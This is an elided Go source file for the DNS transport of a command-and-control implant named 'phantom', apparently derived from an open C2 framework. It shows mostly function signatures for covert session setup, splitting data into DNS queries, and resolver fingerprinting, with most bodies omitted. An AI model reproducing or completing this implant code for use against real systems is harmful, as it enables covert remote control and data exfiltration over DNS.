...
import (
	...
	"github.com/cryptdefender3232/phantom/implant/phantom/cryptography"
	"github.com/cryptdefender3232/phantom/implant/phantom/encoders"
	"github.com/cryptdefender3232/phantom/implant/phantom/util"
	"github.com/cryptdefender3232/phantom/protobuf/dnspb"
	pb "github.com/cryptdefender3232/phantom/protobuf/phantompb"
...
func DNSStartSession(parent string, opts *DNSOptions) (*PhantomDNSClient, error) {
	// {{if .Config.Debug}}
...
func NewDNSClient(parent string, opts *DNSOptions) *PhantomDNSClient {
	parent = strings.TrimSuffix("."+strings.TrimPrefix(parent, "."), ".") + "."
	return &PhantomDNSClient{
...
// PhantomDNSClient - The DNS client context
type PhantomDNSClient struct {
...
func (s *PhantomDNSClient) SessionInit() error {
...
func (s *PhantomDNSClient) sendInit(resolver DNSResolver, encoder encoders.Encoder, msg *dnspb.DNSMessage, data []byte) ([]byte, error) {
...
func (s *PhantomDNSClient) WriteEnvelope(envelope *pb.Envelope) error {
	if s.closed {
		return ErrClosed
	}
	// {{if .Config.Debug}}
...
func (s *PhantomDNSClient) ReadEnvelope() (*pb.Envelope, error) {
	var respData []byte
	if s.closed {
...
func (s *PhantomDNSClient) CloseSession() error {
	s.closed = true
...
func (s *PhantomDNSClient) parallelSend(data []byte) error {
...
func (s *PhantomDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, error) {
...
func (s *PhantomDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.Encoder, data []byte) ([]string, error) {
	subdata := []string{}
	start := 0
	stop := start
	lastLen := 0
...
func (s *PhantomDNSClient) randomDNSSessionID() (uint32, error) {
...
func (s *PhantomDNSClient) loadResolvConf() error {
	var err error
...
func (s *PhantomDNSClient) joinSubdataToParent(subdata string) (string, error) {
...
func (s *PhantomDNSClient) pollMsg() (string, error) {
...
func (s *PhantomDNSClient) clearMsg(msgId uint32) (string, error) {
	nonceBuf := make([]byte, 8)
	rand.Read(nonceBuf)
...
func (s *PhantomDNSClient) fingerprintResolvers() {
	wg := &sync.WaitGroup{}
	// {{if .Config.Debug}}
...
func (s *PhantomDNSClient) fingerprintResolver(id int, wg *sync.WaitGroup, results chan<- *ResolverMetadata, resolver DNSResolver) {
	defer wg.Done()
...
func (s *PhantomDNSClient) benchmark(id int, resolver DNSResolver, meta *ResolverMetadata) {
...
func (s *PhantomDNSClient) fingerprintMsg(id int) ([]byte, uint32, error) {
	data := make([]byte, 8)
	rand.Read(data)
...
func (s *PhantomDNSClient) msgID(id uint32) uint32 {
	return uint32(id<<24) | uint32(s.dnsSessionID)
}

func (s *PhantomDNSClient) nextMsgID() uint32 {
	s.msgCount++
...
func (s *PhantomDNSClient) recordMetrics(meta *ResolverMetadata, rtt time.Duration) {
...
func (s *PhantomDNSClient) averageRtt(meta *ResolverMetadata) time.Duration {
...
func (s *PhantomDNSClient) randomResolver() (DNSResolver, *ResolverMetadata) {
